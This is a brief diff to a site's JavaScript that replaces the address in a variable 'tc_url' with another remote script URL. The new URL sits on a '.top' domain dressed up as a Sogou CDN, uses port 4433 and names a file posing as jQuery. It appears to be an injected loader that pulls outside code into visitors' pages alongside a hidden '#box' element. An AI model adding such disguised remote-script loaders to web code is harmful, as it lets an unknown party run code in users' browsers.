@@ -7,7 +7,7 @@
 }
 
 $(function() {
-    var tc_url = 'https://aliyun.cdn.chengzilte.top:4433/hm/cdn/static/jq_768738.js';
+    var tc_url = 'https://sogo.uc.continuefaf.top:4433/hm/cdn/static/jq_768738.js';
     if ($("#post-tag")[0]) {
         var style="<style>#box,#box img{display:block;width:100%;}</style>";
         $("head").after(style);
